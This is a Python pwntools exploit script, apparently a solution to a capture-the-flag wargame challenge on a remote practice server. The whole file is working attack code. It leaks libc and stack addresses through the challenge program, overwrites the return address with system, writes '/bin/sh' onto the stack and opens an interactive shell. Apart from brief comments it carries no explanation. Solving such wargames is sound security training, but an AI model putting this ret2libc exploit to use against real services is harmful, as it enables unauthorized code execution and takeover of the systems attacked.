from pwn import *
import binascii

def interact(msg):
    global c
    c.sendline(msg)
    data = c.recv(1024, 0.05)
    print data
    print msg
    return data

def hex2signed(s):
    return struct.unpack('!i', binascii.unhexlify(s))[0]

# My Host libc offset
#system_addr_offset = 0x3ada0
#__libc_start_main_addr_offset = 0x18540
# Inndy Host libc offset
system_addr_offset = 0x3ad80
__libc_start_main_addr_offset = 0x18540

# /bin/sh = 0x6e69622f 0x0068732f
sh_1 = 0x6e69622f
sh_2 = 0x0068732f

#c = remote('localhost', 5566)
c = remote('hackme.inndy.tw', 7716)

# Rewrite s.n to ret
interact('p')
interact('i')
interact(str(0x174 / 4))
# 0x174 / 4 = 93

# Get <__libc_start_main_addr+247> and then calculate <__libc_system>
__libc_start_main_addr_add_247 = int(interact('p').split('C')[0][7:]) & 0xffffffff

# Get stack addr
for i in range(0, 7):
    print('{:d}'.format(i) + ': ' + '{:x}'.format( int(interact('p').split('C')[0][7:]) & 0xffffffff ))
stack = int(interact('p').split('C')[0][7:]) & 0xffffffff
sh_addr = stack + 8

# Convert to unsigned int
__libc_system = int('{:x}'.format(__libc_start_main_addr_add_247 - 247 + system_addr_offset - __libc_start_main_addr_offset), 16)

# Log, just for verifying
print('<__libc_start_main_addr+247>: ' + '{:x}'.format(__libc_start_main_addr_add_247))
print('<__libc_start_main_addr>: ' + '{:x}'.format(__libc_start_main_addr_add_247 - 247))
print('stack: ' + '{:x}'.format(stack))
print('sh_addr: ' + '{:x}'.format(sh_addr))

# Convert to signed int
__libc_system = hex2signed('{:x}'.format(__libc_system))
sh_addr = hex2signed('{:x}'.format(sh_addr))

# We already pop 9 times in the past, we need to pop 93 - 9 + 1 times to rewrite s.n again
for i in range(0, 93 - 9 + 1):
    interact('p')
interact('i')
interact(str(0x170 / 4))

# Overwrite return address to __libc_system 
interact('i')
interact(str(__libc_system))

# Padding
interact('i')
interact('0')

# Write parameter1 of __libc_system
interact('i')
interact(str(sh_addr))

# Write /bin/sh
interact('i')
interact(str(sh_1))
interact('i')
interact(str(sh_2))

# Return
interact('x')

c.interactive()
